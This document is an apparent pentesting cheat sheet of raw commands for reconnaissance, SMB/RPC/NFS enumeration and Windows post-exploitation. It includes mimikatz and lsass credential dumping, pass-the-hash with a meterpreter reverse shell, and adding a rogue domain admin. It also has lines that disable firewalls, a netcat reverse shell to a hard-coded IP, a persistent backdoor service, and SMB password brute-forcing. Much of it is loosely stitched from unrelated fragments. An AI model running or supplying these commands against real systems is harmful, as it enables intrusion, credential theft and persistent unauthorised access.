		- site: target.com inurl:portal.php
		- site: target.com inurl:register.php
		- site: target.com intext: “index of /”
		- site: target.com filetype:txt
		- site: target.com inurl:.php.txt
		- site: target.com ext:txt
		- site:trello.com intext:ftp
		- site:trello.com intext:ORG
		- site:target.com filetype:php
		- site:target.com filetype:aspx
		- site:target.com filetype:swf (Shockwave Flash)
		- site:target.com filetype:wsdl
		- site:example.com -www [ Bing, DuckDuckGo, Yahoo]
		- site:http://jfrog.io inurl:yourtarget



site:t.me/joinchat
site:t.me/*

site:pastebin.com "*@gmail.com password"
intext:@gmail.com


# geoip lookup
geoip(){curl -s "http://www.geody.com/geoip.php?ip=${1}" | sed '/^IP:/!d;s/<[^>][^>]*>//g' ;}



# Show current weather for any US city or zipcode
weather() { lynx -dump "http://mobile.weather.gov/port_zh.php?inputstring=$*" | sed 's/^ *//;/ror has occ/q;2h;/__/!{x;s/\n.*//;x;H;d};x;s/\n/ -- /;q';}



links2 -dump http://www.ip-tracker.org/locator/ip-lookup.php?ip=$target > domin.txt






urlcrazy -k $Layout -i -o $Location $Domain
urlcrazy $Domain



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] EyeWitness - OSINT Reconnaissance + Enumeration
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##

eyewitness --web						##  HTTP Screenshot using Selenium
eyewitness -f $File						##  Line-separated file containing URLs to capture
eyewitness -x $File.xml				    ##  Nmap XML or .Nessus file
eyewitness --single $URL			    ##  Single URL/Host to capture
eyewitness --difference				    ##  
eyewitness --user-agent				    ##  
eyewitness -d /$Dir/ 				    ##  
eyewitness --max-retries 5				##  
eyewitness --only-ports 443,1080



EyeWitness --web --single $Domain
EyeWitness --web -f $File -d $Dir/



## ------------------------------------------------------- ##
##   [?] Please provide a file containing target urls.
## ------------------------------------------------------- ##
EyeWitness.py --web -f $File


## --------------------------------------------------------- ##
##   [?] Running eyewitness against all compiled domains
## --------------------------------------------------------- ##
EyeWitness --web -f /recon/httprobe/alive.txt -d $Dir/ --resolve


EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d $Dir/ --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https



## ------------------------------------------------------- ##
##   [?] Please provide URLs file to capture, 
##   [?] a Dir name for output and a User-Agent string.
## ------------------------------------------------------- ##
EyeWitness.py --web -f $File -d $Dir/ --user-agent $UserAgent --prepend-https --no-prompt




EyeWitness.py --web -f $File --timeout 5 --threads 10 -d $Dir --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https


##-============================================-##
##   [+] EyeWitness - Secure VPN Connection:
##-============================================-##
eyewitness --proxy-type socks5 --proxy-ip 10.64.0.1 --proxy-port 1080	## Wireguard 
eyewitness --proxy-type socks5 --proxy-ip 10.8.0.1 --proxy-port 1080	## OpenVPN



##-===========================================================-##
##   [+] EyeWitness - Proxy connection via Proxychains:
##-===========================================================-##
proxychains ./EyeWitness.py --web -f $File.txt --timeout 10 --threads 2 -d $Dir --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https

proxychains ./EyeWitness.py --web -x $File.xml --timeout 10 --threads 2 -d $Dir --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https




## webscreenshot

webscreenshot -i alive.txt -r chromium -o $Dir/$Dir

echo "  - Total $(ls -l reports/screenshots/*.txt | wc -l) screenshots stored in $OUTPATH/reports/screenshots"







## ----------------------------------- ##
###  [?] whatweb - Vulnerable Scan
## ----------------------------------- ##
whatweb $IP





ass -A -i eth0 -v       ## Active mode scanning





## --------------------------------------------------------------------- ##
##    [?] Fierce
## --------------------------------------------------------------------- ##
fierce -dns $Domain


## --------------------------------------------------------------------- ##
##    [?] Firewalk - active reconnaissance network security tool 
## --------------------------------------------------------------------- ##
firewalk -S1-1024 -i eth0 -n -pTCP 10.0.0.1 10.0.2.50


firewalk -S8079-8081 -i eth0 -n -pTCP 192.168.1.1 192.168.0.1



## --------------------------------------------------------------------- ##
##    [?] GoLismero - 
## --------------------------------------------------------------------- ##
golismero scan -i /root/port80.xml -o sub1-port80.html





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] RPC - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




## ------------------------------------------------------------------------- ##
##   [?] rpc.idmapd          ## [?] The NFSv4 ID <-> name mapping daemon
## ------------------------------------------------------------------------- ##
##   [?] rpc.idmapd          ## [?] NFSv4 ID <-> Name Mapper
## ------------------------------------------------------------------------- ##
## 
## 
##-=========================================================================-##
##                         [?] RPC - Config Files [?]
##-=========================================================================-##
## ------------------------------------------------------------------------- ##
##   [?] /etc/idmapd.conf
## ------------------------------------------------------------------------- ##
##   [?] 
## ------------------------------------------------------------------------- ##
##   [?] 
## ------------------------------------------------------------------------- ##



## ----------------------------------------- ##
##   [?] Check if RPC Service is Running
## ----------------------------------------- ##
rpcinfo -p $IP
rpcbind -p $IP


##-===========================================-##
##   [+] RPCInfo - Report RPC Information
##-===========================================-##
rpcinfo -p | egrep -w "port|81[14]"


## ---------------------------------------------------------------- ##
##   [?] Connect to an RPC share without a username and password 
## ---------------------------------------------------------------- ##
##-===================================-##
##   [+] Then Enumerate Privileges:
##-===================================-##
rpcclient --user="" --command=enumprivs -N $IP


## ---------------------------------------------------------------- ##
##   [?] Connect to an RPC share without a username and password 
## ---------------------------------------------------------------- ##
##-===================================-##
##   [+] Then Enumerate Privileges:
##-===================================-##
rpcclient --user="" --command=enumprivs $IP



rpcclient $> srvinfo                        ## Explore a remote smb service with an empty user/pass
rpcclient $> enumdomusers                       ## Allows further info on Windows version
rpcclient $> getdompwinfo                       ## Get a list of users
rpcclient $> enumalsgroups domain
rpcclient $> lookupnames administrators
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> queryuser john


##-==========================-##
##  [+] Dump RPC Endpoints
##-==========================-##
/opt/impacket/examples/rpcdump.py $User:$Pass@$TargetIP


##-========================-##
##  [+] Get SID Via RPC:
##-========================-##
/opt/impacket/examples/lookupsid.py $User:$Pass@$TargetIP

impacket-rpcdump $IP -port $Port



secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL




##-=============================================-##
##  [+] Shutdown a Windows machine from Linux
##-=============================================-##
net rpc shutdown -I $IPAddrWin -U $User%$Pass


##-========================================================-##
##   [+] Print all messages to console, verbosity lvl 3
##-========================================================-##
rpc.idmapd -f -vvv


##-==============================================-##
##  [+] NMap - Run RPC Enumeration NSE script:
##-==============================================-##
nmap --script=msrpc-enum.nse $TARGET
nmap --script msrpc-enum --script-args vulns.showall $IP -oN nmap_msrpc_$IP.txt


##-==============================================-##
##  [+] NMap - rpcinfo NSE Enumeration Script:
##-==============================================-##
nmap --script rpcinfo.nse $IP -p 111


##-========================================-##
##  [+] NMap - Run All RPC NSE Scripts:
##-========================================-##
nmap -p 135 --script=rpc* $TARGET


##-=============================================-##
##   [+] Metasploit - RPC Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "rpc" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=135 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "dce" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=135 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] NFS - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



nfsidmap


##-==========================-##
##   [+] Find NFS Port
##-==========================-##
nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port; $IP


##-==========================-##
##   [+] Show NFS Mounts
##-==========================-##
nmap -sV --script=nfs-showmount $IP


##-===================================-##
##   [+] Show Mountable NFS Shares
##-===================================-##
nmap --script=nfs-showmount -oN mountable_shares; $IP; showmount -e; $IP

nmap --script=nfs-ls.nse $TARGET
nmap --script=nfs-showmount.nse $TARGET
nmap --script=nfs-statfs.nse $TARGET

nmap -p 111 --script=nfs-* $TARGET


mount $TARGET:/vol/share /mnt/nfs

mount -t nfs $IP:/var/myshare /mnt/shareddrive
mount -t nfs $IP:/mountlocation /mnt/mountlocation

serverip:/mountlocation /mnt/mountlocation nfs defaults 0 0


mount -o port=2049,mountport=44096,proto=tcp 127.0.0.1:/home /home


## -------------------------------------------------------------------- ##
##   [?] discover available Windows shared drives or for NFS shares.
## -------------------------------------------------------------------- ##
net view \\<remote system>

showmount -e                    ## list Shares
showmount -a -d -e $TARGET      ## 


##-=============================================-##
##   [+] Metasploit - NFS Auxiliary Scanner:
##-=============================================-##
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "nfs" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=111 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SMB - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===========================-##
##   [+] Connect to share
##-===========================-##
smbclient \\\\[$IP\]\\\[share name\]


##-==================================================-##
##   [+] test server credentials using $AUTH_FILE
##-==================================================-##
smbclient -L $p -A $AUTH_FILE


##-===========================-##
##   [+] 
##-===========================-##
smbclient -L\\ -N -I $1 2>&1 | tee "smbclient_$1.txt"


##-===========================-##
##  [+] Enumerate Hostnames
##-==========================-##
nmblookup -A $IP

nmblookup -U $Domain -R '$Workgroup'


##-======================================-##
##   [+] SMBLookup - Investigate share
##-======================================-##
smblookup -A $TARGET smbclient //MOUNT/share -I $TARGET -N


##-=========================================-##
##   [+] SMBMap - List Shares with creds
##-=========================================-##
smbmap -H $IP -d $Domain -u $User -p $Pass -r --depth 5 -R


##-==============================================================-##
##   [+] SMBMap - List Shares with no creds and guest account
##-==============================================================-##
smbmap -H $IP/$Hostname -u $User -p $Pass -R


##-=====================================================-##
##   [+] SMBMap - Guest User and null authentication
##-=====================================================-##
smbmap -u anonymous -p anonymous -H 10.10.10.172
smbmap -u $User -p $Pass -H 10.10.10.172
smbmap -u '' -p '' -H 10.10.10.172


##-========================================-##
##   [+] SMBMap - List Shares with creds
##-========================================-##
smbmap -H $IP -d $Domain -u $User -p $Pass -r --depth 5 -R


##-========================================-##
##   [+] SMBMap - 
##-========================================-##
smbmap -H $IP -d $Domain -u $User -p $Pass   -r --depth 5 -R


##-========================================-##
##   [+] SMBMap - 
##-========================================-##
smbmap -H $1 -P $2 2>&1 | tee -a "smbmap-share-permissions_$1_$2.txt"
smbmap -u null -p "" -H $1 -P $2 2>&1 | tee -a "smbmap-share-permissions_$1_$2.txt"



##-========================================-##
##   [+] SMBMap - 
##-========================================-##
smbmap -H $1 -P $2 -x "ipconfig /all" 2>&1 | tee -a "smbmap-execute-command_$1_$2.txt"
smbmap -u null -p "" -H $1 -P $2 -x "ipconfig /all" 2>&1 | tee -a "smbmap-execute-command_$1_$2.txt"




##-=====================================-##
##   [+] semi-interactive smb-client
##-=====================================-##
python3 /opt/impacket/examples/smbclient.py $User@$TargetIP
python3 /opt/impacket/examples/smbclient.py '$User'@$TargetIP
python3 /opt/impacket/examples/smbclient.py ''@$TargetIP



impacket-smbserver share -smb2support /tmp/
copy \\$IP\share\nc.exe

impacket-smbserver share -smb2support /tmp/


impacket-smbserver -username guest -password guest -smb2support share  $\(pwd\)




##-==========================-##
##   [+] Find open shares
##-==========================-##
Showmount -e $TARGET/<port>


##-=========================-##
##   [+] Mount smb share:
##-=========================-##
mount -t cifs //server ip/share/dir/; -o username=”guest”,password=””

mount -o hard,nolock target-ip:/home folder

mount -t cifs -o user=username,domain=domainname //target-ip/share /mnt/folder


##-===============================================-##
##   [+] Mount remote SMB shares on your router
##-===============================================-##
mount \\\\192.168.1.100\\ShareName /cifs1 -t cifs -o "username=User,password=Pass"



##-===========================================-##
##   [+] Mount Linux/Windows CIFS Server
##-===========================================-##
Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””
C:\>net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no


##-===================================-##
##   [+] Mount Remote Windows Share:
##-===================================-##
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw



smbtree -NS 2>/dev/null
nbtscan -r <current_IPrange>
netdiscover -r <current_IPrange>
nmap -n -Pn -T5 -sS <current_IPrange>




##-========================================-##
##   [+] NBTScan - Netbios Enumeration:
##-========================================-##
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt


##-=======================================================-##
##   [+] NBT name scan For addresses from 10.0.2.0/24
##-=======================================================-##
nbtscan -r 10.0.2.0/24


##-=======================================-##
##   [+] Netbios Information Scanning
##-=======================================-##
nbtscan -r $IP/24


##-===========================================-##
##   [+] Find Service Provided By Machines:
##-===========================================-##
nbtscan -hv $IP/24


##-========================================-##
##   [+] Show logged in users/addresses
##-========================================-##
nbtscan $TARGET -R 54


##-===========================================-##
##   [+] Nmap - find exposed Netbios servers
##-===========================================-##
nmap -sU --script nbstat.nse -p 137 $IP


##-========================================-##
##   [+] Nmap - Check target for Netbios vulns
##-========================================-##
nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 $IP


##-===========================================-##
##   [+] Nmap - Enumerate SMB Users
##-===========================================-##
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $IP-14


##-==============================================-##
##   [+] Nmap - List SMB Shares with no creds
##-==============================================-##
nmap --script smb-enum-shares -p 139,445 $IP
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=$User,smbpass=$Pass -p445 192.168.1.0/24


##-====================================-##
##   [+] Nmap - Enumerate SMB users
##-====================================-##
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.0/24
python /usr/share/doc/python-impacket-doc/examples/samrdump.py $TARGET


nmap --script smb-enum-groups

##-========================================-##
##   [+] Nmap - SMB Vulnerability Scans
##-========================================-##
nmap --script="+\*smb\* and not brute and not dos and not fuzzer" -p 139,445 -oN smb-vuln; $IP


##-==============================================-##
##   [+] Nmap - SMB Scans - All NSE Vuln Scans 
##-==============================================-##
nmap -p139,445 $IP --script smb-vuln*


##-==========================================================-##
##   [+] Nmap - SMB Scans - NSE All Scans - Show All Vulns
##-==========================================================-##
nmap --script smb-* --script-args vulns.showall $IP -oN nmap_smb_$ip.txt





##-================================================-##
##   [+] Metasploit - SMB Scanner - RID Cycling
##-================================================-##
use auxiliary/scanner/smb/smb_lookupsid


ridenum


##-==================================================-##
##   [+] Metasploit - HashDump Meterpreter Module:
##-==================================================-##
meterpreter > run post/windows/gather/hashdump

## ---------------------------------------------------------------------------------------- ##
##    Administrator:500:aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896:::
## ---------------------------------------------------------------------------------------- ##


msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
msf exploit(psexec) > exploit
meterpreter > shell


##-==========================================-##
##   [+] Metasploit - Dump Windows Hashes:
##-==========================================-##
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE


##-======================================-##
##   [+] Metasploit - Find The Admins
##-======================================-##
## spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > set rhosts 10.10.10.0/24
msf > set threads 8
msf > run




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] Metasploit - MimiKatz - Pentesting + Post Explotation
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##      [+] Metasploit - Meterpreter Shell - Cheatsheet
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > load mimikatz
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > kerberos
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
## ---------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > msv				## [?] Your AD password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > livessp			## [?] Your Windows8 password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > ssp				## [?] Your outlook password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > tspkg		    ## [?] Your AD password
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > wdigest			## [?] Your AD password
## ---------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::listStores
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::listCertificates
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
## ---------------------------------------------------------------------------------------------------- ##
      meterpreter > mimikatz_command -f crypto::patchcapi
## ---------------------------------------------------------------------------------------------------- ##






## -------------------------------------------------------------------------- ##
     meterpreter > load mimikatz    ##  [?] 
     meterpreter > kerberos         ##  [?] 
     meterpreter > msv				##  [?] AD password
     meterpreter > livessp			##  [?] Windows8 password
     meterpreter > ssp				##  [?] outlook password
     meterpreter > tspkg			##  [?] AD password
     meterpreter > wdigest			##  [?] AD password
## -------------------------------------------------------------------------- ##
     meterpreter > msv				##  [?] AD password
     meterpreter > livessp			##  [?] Windows8 password
     meterpreter > ssp				##  [?] outlook password
     meterpreter > tspkg			##  [?] AD password
## -------------------------------------------------------------------------- ##
     meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
## -------------------------------------------------------------------------- ##



meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > impersonate_token TVM\domainadmin
meterpreter > add_user hacker $Pass -h 192.168.0.10
meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10
meterpreter > getuid
meterpreter > shell


C:\> whoami
## ------------------------------------------------ ##
##    mydom\adaministrator
## ------------------------------------------------ ##
C:\> net user $User /add /domain
C:\> net group "Domain Admins" $User /add /domain



##-=======================================-##
##   [+] Metasploit - Post Exploitation
##-=======================================-##
meterpreter> sysinfo
meterpreter> run post/windows/gather/checkvm
meterpreter> run get_local_subnets


## ------------------------------------------------ ##
##   [?] Find Group Policy Preference XML files:
## ------------------------------------------------ ##
C:>findstr /S cpassword %logonserver%\sysvol\*.xml
meterpreter > post/windows/gather/credentials/gpp



##-======================================-##
##   [+] Meterpreter - Dump remote SAM:
##-======================================-##
meterpreter> run post/windows/gather/smart_hashdump



##-=========================================-##
##   [+] SamDump2 - Dump Remote SAM Hash:
##-=========================================-##
samdump2 -o out /mnt/ntfs/WINDOWS/system32/config/system /mnt/ntfs/WINDOWS/system32/config/sam


##-====================================-##
##   [+] Mimikatz - Dump SAM Hashes:
##-====================================-##
mimikatz_command -f samdump::hashes



meterpreter > getuid
## ------------------------------------------------ ##
##    Server username: win7-64-victim\Workshop
## ------------------------------------------------ ##



meterpreter > getsystem
## ------------------------------------------------ ##
##    ...got system (via technique 1).
## ------------------------------------------------ ##



meterpreter > getuid
## ------------------------------------------------ ##
##    Server username: NT AUTHORITY\SYSTEM
## ------------------------------------------------ ##


##-===========================================-##
##   [+] Meterpreter - Use Priv Esc Module:
##-===========================================-##
meterpreter > use priv
meterpreter > run post/windows/escalate/getsystem



##-================================-##
##   [+] Net - Add Windows User:
##-================================-##
net user $User $Pass /ADD
net localgroup Administrators $User /ADD



net user $User password /ADD /DOMAIN
net group "Domain Admins" $User /ADD /DOMAIN



## ---------------------------------------------------------------- ##
##   [?] Net - Add $User Into LocalGroup "Remote Desktop Users"
## ---------------------------------------------------------------- ##
net localgroup "Remote Desktop Users" #$User /add  


##-============================================-##
##   [+] Net - Change Admin Users Password:
##-============================================-##
net user admin $Pass


##-=========================================-##
##   [+] NetSh - Firewall - Enabling RDP  
##-=========================================-##
netsh firewall add portopening TCP 3389 "Open Port 3389" ENABLE ALL  
netsh firewall set portopening TCP 3389 proxy ENABLE ALL  
netsh firewall set service RemoteDesktop enable  
reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 0 /f


##-=========================================-##
##   [+] NetSh - Firewall - Disable RDP
##-=========================================-##
reg add "HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 1 /f  
netsh firewall delete portopening protocol=TCP port=3389




##-======================================-##
##   [+] Windows Post Exploitation:
##-======================================-##
ipconfig /all
systeminfo
net localgroup administrators
net view
net view /domain
net accounts /domain
Net group  
Net localgroup
net group "Domain Admins" /domain



##-===================================-##
##   [+] Windows Post Exploitation:
##-===================================-##
Arp -a  
netstat -ano  
route print  


##-===================================-##
##   [+] Windows - Scheduled tasks     
##-===================================-##
schtasks /query /fo LIST /v     ## List Scheduled tasks
schtasks /Run /TN mytask        ## Run Scheduled tasks
schtasks /Delete /TN mytask     ## Delete Scheduled tasks 

Create - `schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR "mycommands"`     


##-============================-##
##   [+] Windows - Task Cmd 
##-============================-##
tasklist /SVC             ## List Running tasks
taskkill /IM $Exe /F      ## Kill .Exe Task
taskkill /PID $PID /F     ## Kill by The PID


##-=================================-##
##   [+] Windows - Services Cmd
##-=================================-##
net start                   ## List Services

sc getkeyname "long name"   ## Long name to key name
sc qc $Key                  ## Service Details
sc config $Key              ## Service Config


##-=================================-##
##   [+] Netsh - Firewall - Show:
##-=================================-##
netsh firewall show config
netsh firewall show state
netsh firewall set opmode disable            # Disable firewall.

netsh wlan show interfaces
netsh wlan show drivers
netsh wlan show networks
netsh wlan show profiles
netsh wlan show profiles name="name"


##-============================================-##
##   [+] Are Installers are running as elevated?   
##-============================================-##
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated


##-============================================-##
##   [+] Windows - Find Interesting Pass Files     
##-============================================-##
dir /s *pass* == *cred* == *vnc* == *.config*  
findstr /si password *.xml *.ini *.txt

##-=====================================================-##
##   [+] Windows - Find Interesting Registry Entries:
##-=====================================================-##
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s 


##-=====================================================-##
##   [+] Local File Inclusion (LFI) - Windows Files:
##-=====================================================-##
##  %SYSTEMROOT%\repair\system  
##  %SYSTEMROOT%\repair\SAM  
##  %SYSTEMROOT%\repair\SAM  
##  %WINDIR%\win.ini  
##  %SYSTEMDRIVE%\boot.ini  
##  %WINDIR%\Panther\sysprep.inf  
##  %WINDIR%\system32\config\AppEvent.Evt  
##  c:\windows\system32\drivers\etc\hosts
##-=====================================================-##





## --------------------------------------------------------------------------- ##
##   [?] Retrieves all ​IP​ address subnets used in the internal network 
##       by the ​DHCP​ service typically running on the domain controller 2. 
## --------------------------------------------------------------------------- ##
dsquery ​subnet​ -o rdn -limit 0 -u <domain suffix>\$User -p $Password


## -------------------------------------------------------------- ##
##   [?] Retrieves the hostnames of all domain controllers 
##       from the domain a querying system is connected. 3. 
## -------------------------------------------------------------- ##
dsquery server -o rdn -limit 0 -u <domain suffix>\$User -p $Password


## --------------------------------------------------------------------- ##
##   [?] Retrieves the hostnames of all systems
##       except the domain controllers the domain is querying from.
## --------------------------------------------------------------------- ##
dsquery computer -o rdn -limit 0 -u <domain suffix> $User -p $Password


nltest /dclist:<dns suffix> 


nltest /server:<domain controller> /domain_trusts




##-======================================================-##
##   [+] PowerShell - join our test machine to the AD:
##-======================================================-##
add-computer –domainname <FQDN-DOMAIN> -Credential $Domain\$User -restart –force

add-computer –domainname org.local -Credential ORG\john -restart –force


##-==========================================================-##
##   [+] list all computers that were added by non-admins:
##-==========================================================-##
Import-Module ActiveDirectory
Get-ADComputer -LDAPFilter "(ms-DS-CreatorSID=*)" -Properties ms-DS-CreatorSID


##-===================================================================-##
##   [+] LDAP - collect the information from the domain controller:
##-===================================================================-##
python ldapdomaindump.py -u $Domain\$User -p $Pass -d <DELIMITER> $DCIP

python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1




 

net localgroup Users

net localgroup Administrators

search dir/s *.doc

system(start cmd.exe /k $cmd)

sc create microsoft_update binpath=cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe start=auto error=ignore

/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779

mimikatz.exe privilege::debug log sekurlsa::logonpasswords

Procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe sekurlsa::minidump lsass.dmp log sekurlsa::logonpasswords

C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits

C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

 

 
##-====================================-##
##   [+] Plink - SSH Tunnel:
##-====================================-## 
plink.exe -P 22 -l root -pw 1234 -R 445:127.0.0.1:445 X.X.X.X


##-====================================-##
##   [+] Enable RDP Access:
##-====================================-## 
reg add hklm\system\currentcontrolset\control\terminal server /f /v fDenyTSConnections /t REG_DWORD /d 0

netsh firewall set service remoteadmin enable

netsh firewall set service remotedesktop enable

 
##-====================================-##
##   [+] Netsh - Turn Off Firewall:
##-====================================-## 
netsh firewall set opmode disable





##-===============================================================-##
##   [+] Metasploit - MSFElfScan - Find a good JMP ESP Aaddress
##-===============================================================-##
msfelfscan -j ESP binaries/peercast_binary







$HOME/.wireshark



wireshark --interface wlo1  -k -z -w  /var/log/wireshark.log 





--log-level "debug"



##  Write log messages and stderr output to the specified file
--log-file /var/log/wireshark.log



Only print messages for the specified log domains

--log-domains 






-z smb,srt[,filter]

Collect call/reply SRT (Service Response Time) data for SMB. 





-z "smb,srt,ip.addr==1.2.3.4"

collect stats only for SMB packets exchanged by the host at IP address 1.2.3.4







shows VoIP calls found in the capture file

-z voip,calls




-z wlan,stat[,<filter>]

           Show IEEE 802.11 network and station statistics




dumpcap
tcpcapinfo
getpcaps

ivstools
log2pcap

pcap-filter
pcapdump        
pcapfix         
pcapip          
pcappick        
pcapuc          
rawshark        
tcpliveplay     
tcpprep         
tcpreplay       
tcpreplay-edit  
tcprewrite      
tcpslice        

tcptrace (1)       
tcptracer-bpfcc (8)
tcptraceroute (1)  
tcptraceroute.db (8
tcptraceroute.mt (1
tcptrack (1)       
tcpxtract (1)      
tctrace
tcpslice (1)       
tcpstat

tcpflow (1)        
tcpick (8)         
tcpkill (8)        
tcplife.bt (8)     
tcplife-bpfcc (8)  
tcpnice (8)        
tcpprof (1)        
tcpreen

afl-gotcpu (8)     

rpc_soc (3t)       
clock_getcpuclockid
dns2tcpc (1)       
dns2tcpd (1)       
faked-tcp (1)      
fakeroot-tcp (1)   
tcpbridge (1)      
tcpcapinfo (1)     
tcpliveplay (1)    
tcpprep (1)        
tcpreplay (1)      
tcpreplay-edit (1) 
tcprewrite (1)     
flowgrind (1)      
flowgrind-stop (1) 
flowgrindd


















## ---------------------------------------------------------------------------------- ##
##    [?] SMB password dictionary attack tool that targets windows authentication
## ---------------------------------------------------------------------------------- ##
acccheck.pl -T smb-ips.txt -v



hydra  -v  -l Administrator -P fpass.lst smb://11.1.11.1 >> brute_smb.out
medusa -h 192.168.0.20 -u administrator -P passwords.txt -e ns -M smbnt >> brute_smb.out
hydra -L user.txt -P pass.txt -e ns -f -v -V -w5 10.10.10.2 smb >> brute_smb.out





##-=========================================================-##
##  [+] enum4linux - Enumerate using SMB (null session)
